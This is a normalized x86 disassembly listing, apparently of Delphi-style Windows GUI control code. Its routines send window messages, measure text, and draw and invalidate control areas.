test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_449d48
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4033fc
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_449d48
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
mov eax esi
mov edx [ rw-data ]
call sub_4033fc
test al al
jne r-xdata
mov eax esi
call sub_4031b8
mov edx r-xdata
call sub_4394ec
test al al
jne r-xdata
mov eax esi
call sub_4031b8
mov edx r-xdata
call sub_4394ec
test al al
jne r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_439728
push 0x0
mov eax esi
call sub_44d054
push eax
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_4080ac
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_446794
sub_439728
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_44d054
push eax
push 0x469
mov eax ebp
call sub_44d054
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_445f20
mov edx edi
sub edx ebp
mov eax ebx
call sub_445ed4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43977c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_445c34
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_44d358
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_44d054
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_4397cc
push ebx
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_439804
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406b88
push eax
push 0x0
push 0x465
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_43984c
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406b88
push eax
push 0x0
push 0x465
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439894
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_4398f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4399bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4399c3
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_4393bc
test al al
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406b88
push eax
push 0x0
push 0x467
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_4080ac
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446794
sub_4399cc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_44a5f4
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439a40
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_44a5f4
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439a7c
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_44a5f4
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439ab8
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_44a5f4
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439af4
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_44a5f4
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439b30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d80
mov edx 0x79
mov eax esi
call sub_445f20
mov edx 0x19
mov eax esi
call sub_445f44
mov dl 0x1
mov eax esi
call sub_44d288
xor edx edx
mov eax esi
call sub_446928
mov [ esi + 0x208 ] 0x1
mov al [ r-xdata ]
mov [ esi + 0x20a ] al
mov al [ r-xdata ]
mov [ esi + 0x209 ] al
mov [ esi + 0x20c ] 0x41
mov eax esi
call sub_439de8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_439bbd
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x40
call sub_436150
mov edx esi
mov eax ebx
call sub_449ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
sub_439c04
push ebx
mov ebx eax
mov eax ebx
call sub_44a00c
xor eax eax
mov al [ ebx + 0x209 ]
xor edx edx
call sub_406b88
push eax
xor eax eax
mov al [ ebx + 0x20a ]
push eax
push 0x403
mov eax ebx
call sub_44d054
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406b74
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
sub_439c78
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x209 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x209 ] al
xor eax eax
mov al [ esp ]
xor edx edx
call sub_406b88
push eax
xor eax eax
mov al [ ebx + 0x20a ]
push eax
push 0x403
mov eax ebx
call sub_44d054
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406b74
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439ce8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x20a ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x20a ] al
xor eax eax
mov al [ ebx + 0x209 ]
xor edx edx
call sub_406b88
push eax
xor eax eax
mov al [ esp + 0x4 ]
push eax
push 0x403
mov eax ebx
call sub_44d054
push eax
call SendMessageA
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406b74
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_44d054
push eax
call SendMessageA
sub_439d58
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x402
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov edx eax
mov eax ebx
call sub_439ee0
pop ebx
retn
sub_439d7c
push ebx
mov ebx eax
mov eax ebx
call sub_439e90
push 0x0
mov dl [ ebx + 0x209 ]
mov al [ ebx + 0x20c ]
call sub_406b74
movzx eax ax
push eax
push 0x401
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
sub_439db4
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_439de8
pop ebx
retn
sub_439de8
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_42392c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_445f44
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_439e90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
and ax 0x1fff
mov [ ebx + 0x20c ] ax
mov al [ r-xdata ]
mov [ ebx + 0x209 ] al
test si 0x2000
je r-xdata
test si 0x4000
je r-xdata
or [ ebx + 0x209 ] 0x1
test si 0x8000
je r-xdata
or [ ebx + 0x209 ] 0x2
pop esi
pop ebx
retn
or [ ebx + 0x209 ] 0x4
sub_439ee0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_406b98
mov [ ebx + 0x209 ] al
mov eax esi
and eax 0xff
mov [ ebx + 0x20c ] ax
test [ ebx + 0x209 ] 0x1
je r-xdata
test [ ebx + 0x209 ] 0x2
je r-xdata
add ax 0x2000
test [ ebx + 0x209 ] 0x4
je r-xdata
add ax 0x4000
pop esi
pop ebx
retn
add ax 0x8000
sub_439f2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x6 ] 0x300
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x212 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_439f64
push cs
push cs
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x61506574
jb r-xdata
pop esp
insd
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
add [ eax ] al
push ebx
push esi
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x238 ] 0x1
mov [ esi + 0x236 ] 0x1
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d80
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x64
mov eax esi
call sub_445f20
mov edx 0x50
mov eax esi
call sub_445f44
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
add esp 0xfffffff0
call sub_4035bc
sub_43a00c
push ebx
push esi
add esp 0xfffffee8
mov esi edx
mov ebx eax
mov eax 0x80
call sub_436150
mov edx esi
mov eax ebx
call sub_449ee0
call sub_4361c4
cmp eax 0x40047
jge r-xdata
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
mov eax [ esi + 0x4 ]
xor edx edx
mov dl [ ebx + 0x210 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x235 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x236 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
and [ esi + 0x24 ] 0xfffffffc
call sub_4361c4
cmp eax 0x40047
jge r-xdata
mov eax ebx
call sub_43a520
mov [ esi + 0x34 ] eax
add esp 0x118
pop esi
pop ebx
retn
push 0x2
lea edx [ esp + 0x1c ]
mov eax [ ebx ]
call sub_4031c0
lea eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x4
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x4 ]
mov edx r-xdata
lea eax [ esi + 0x4c ]
call sub_408d28
sub_43a101
add [ eax ] al
add [ ebx - 0x75 ] dl
fadd st6
and [ ecx ] 0x2
add [ eax ] al
add dh al
and [ eax ] 0x2
add [ eax ] al
add [ ebx - 0x10f173d ] cl
add [ eax ] al
mov eax ebx
call sub_43a160
pop ebx
retn
sub_43a128
push ebx
push esi
push ecx
mov esi eax
mov bl [ esi + 0x208 ]
mov al [ esi + 0x220 ]
mov [ esp ] al
xor edx edx
mov eax esi
call sub_43a8d4
mov eax esi
call sub_44a3f0
mov al [ esp ]
mov [ esi + 0x220 ] al
mov [ esi + 0x208 ] bl
pop edx
pop esi
pop ebx
retn
sub_43a160
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43a8d4
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
mov dl 0x1
mov eax ebx
call sub_43a6f4
sub_43a190
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_44de1c
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push 0xffffffff
push 0xffffffff
push eax
call InflateRect
sub_43a1cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44deac
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x13
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetDCEx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43a2c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call GetWindowRect
mov ecx [ ebp - 0x14 ]
neg ecx
mov edx [ ebp - 0x18 ]
neg edx
lea eax [ ebp - 0x18 ]
call sub_4060c4
mov eax [ ebp - 0xc ]
dec eax
push eax
mov eax [ ebp - 0x10 ]
dec eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x18 ]
inc eax
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
push 0x0
push 0x1
push 0x1
call CreatePen
mov ebx eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_423458
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetBkColor
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call Rectangle
test esi esi
je r-xdata
push ebx
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call ReleaseDC
retn
push esi
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
sub_43a2e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44b530
push 0xffffffff
push 0x0
mov eax ebx
call sub_44d054
push eax
call InvalidateRect
mov eax [ ebx + 0x218 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x21c ]
xor edx edx
xor eax eax
call sub_4060a0
cmp [ ebx + 0x210 ] 0x0
je r-xdata
push esp
mov eax ebx
call sub_44d054
push eax
call ValidateRect
mov eax ebx
call sub_44d054
push eax
call UpdateWindow
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44d054
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_4461ac
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
sub eax edx
sar eax 0x1
jns r-xdata
push eax
mov eax ebx
call sub_446168
mov edx eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
lea eax [ esp + 0x4 ]
pop ecx
call sub_4060c4
adc edx 0x0
sub_43a3b0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ ebx + 0x6 ]
dec ax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
pop esi
pop ebx
retn
dec ax
je r-xdata
cmp [ esi + 0x23c ] 0x0
jne r-xdata
jmp r-xdata
dec [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
jmp r-xdata
pop esi
pop ebx
retn
sub_43a4a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20c ]
call sub_40403c
mov al [ ebx + 0x211 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x228 ]
mov [ esi + 0x8 ] eax
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x230 ]
call sub_40403c
mov eax [ ebx + 0x22c ]
mov [ esi + 0x10 ] eax
pop esi
pop ebx
retn
sub_43a4e0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x20c ]
mov edx [ esi ]
call sub_40403c
mov al [ esi + 0x4 ]
mov [ ebx + 0x211 ] al
mov eax [ esi + 0x8 ]
mov [ ebx + 0x228 ] eax
lea eax [ ebx + 0x230 ]
mov edx [ esi + 0xc ]
call sub_40403c
mov eax [ esi + 0x10 ]
mov [ ebx + 0x22c ] eax
pop esi
pop ebx
retn
sub_43a520
cmp [ eax + 0x211 ] 0x0
je r-xdata
mov edx [ eax + 0x228 ]
test edx edx
je r-xdata
call sub_43617c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
jmp r-xdata
retn
sub_43a558
push ebx
mov ebx eax
mov al [ ebx + 0x211 ]
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
pop ebx
retn
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov eax [ ebx + 0x20c ]
jmp r-xdata
mov eax [ ebx + 0x22c ]
mov eax [ ebx + 0x230 ]
jmp r-xdata
pop ebx
retn
sub_43a59c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a520
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push 0x40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ae1c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a558
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b250
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x230 ]
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b1f8
jmp r-xdata
pop ebx
pop ebp
retn
sub_43a630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_43a59c
pop ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43a6e6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx 0x30
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x30
jne r-xdata
xor ecx ecx
mov edx 0x40
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x40
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41ab94
xor ecx ecx
mov edx 0x44
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x44
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x21c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41ab94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a6ed
mov eax [ ebp - 0x8 ]
call sub_403270
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x218 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41ab94
sub_43a6f4
test [ eax + 0x1c ] 0x2
je r-xdata
cmp dl [ eax + 0x208 ]
je r-xdata
test dl dl
je r-xdata
retn
test dl dl
je r-xdata
mov [ eax + 0x234 ] 0x1
retn
call sub_43ab6c
mov edx [ eax + 0x224 ]
push edx
mov cx [ eax + 0x23a ]
mov dx [ eax + 0x238 ]
call sub_43aabc
jmp r-xdata
sub_43a748
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x211 ]
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x211 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
call sub_4361c4
cmp eax 0x40047
jl r-xdata
mov [ esi + 0x221 ] al
mov [ esi + 0x211 ] bl
lea eax [ esi + 0x20c ]
call sub_403fe8
xor eax eax
mov [ esi + 0x228 ] eax
lea eax [ esi + 0x230 ]
call sub_403fe8
xor eax eax
mov [ esi + 0x22c ] eax
test bl bl
jne r-xdata
mov al 0x1
mov eax esi
call sub_43ab18
xor edx edx
mov eax esi
call sub_43a8d4
jmp r-xdata
sub_43a7bc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_404498
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404954
xor eax eax
push ebp
push sub_43a8c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ ebp - 0x8 ]
call sub_407f3c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a8cd
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404a18
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_43a4a0
xor eax eax
push ebp
push sub_43a888
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x20c
mov edx [ ebp - 0x8 ]
call sub_40403c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x228 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x230
call sub_403fe8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x22c ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ab18
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43a8d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43a88d
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_43a4e0
call sub_403a4c
call sub_403aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a8cd
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404a18
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_43a8d4
push esi
mov esi eax
cmp dl [ esi + 0x220 ]
je r-xdata
pop esi
retn
test dl dl
je r-xdata
mov eax esi
call sub_43aa74
mov [ esi + 0x220 ] al
mov eax esi
call sub_43a9d4
mov [ esi + 0x220 ] al
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax esi
mov si 0xffee
call sub_40346c
jmp r-xdata
sub_43a930
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x238 ] si
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_43ab6c
mov edx esi
mov eax ebx
call sub_43ab38
sub_43a9a4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_43a8d4
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_43a9d4
push esi
add esp 0xffffffec
mov esi eax
cmp [ esi + 0x221 ] 0x0
je r-xdata
mov eax esi
call sub_44d030
cmp [ esi + 0x210 ] 0x0
jne r-xdata
mov eax esi
call sub_44a5f4
mov eax esi
call sub_43a558
push eax
mov eax esi
call sub_43a520
mov ecx eax
mov edx 0x464
mov eax esi
call sub_44790c
test eax eax
setne [ esp ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_446104
cmp [ esp ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_446124
mov al [ esp ]
add esp 0x14
pop esi
retn
mov eax esi
call sub_43a630
mov [ esi + 0x238 ] 0x1
mov ax [ esi + 0x214 ]
mov [ esi + 0x23a ] ax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43aa74
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x464
mov eax esi
call sub_44d054
push eax
call SendMessageA
test eax eax
setne bl
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_43ab6c
sub_43aabc
push ebp
